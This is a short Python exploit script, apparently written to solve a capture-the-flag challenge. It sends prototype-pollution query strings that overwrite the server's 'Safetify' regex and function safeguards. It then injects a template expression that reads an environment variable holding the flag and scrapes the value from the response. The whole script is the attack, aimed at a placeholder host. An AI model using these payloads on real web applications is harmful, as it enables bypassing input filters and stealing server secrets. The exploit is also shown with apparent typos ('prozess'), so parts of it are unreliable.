import requests
from bs4 import BeautifulSoup

url = 'http://HOST:PORT'

def overwriteRegExp():
	params = '/?constructor[name][constructor][SafetifyRegExp]=z'
	r = requests.get(url=url+params)

def overwriteFunc():
	params = '/?constructor[name][constructor][SafetifyFunc]=c'
	r = requests.get(url=url+params)

def getFlag():
	overwriteRegExp()
	overwriteFunc()
	params = {'content':'p #{this.prozess.env.FLAG}'}
	r = requests.get(url=url,params=params)
	sourp = BeautifulSoup(r.content,'html.parser')
	flag = sourp('p')[4]
	print(flag)

getFlag()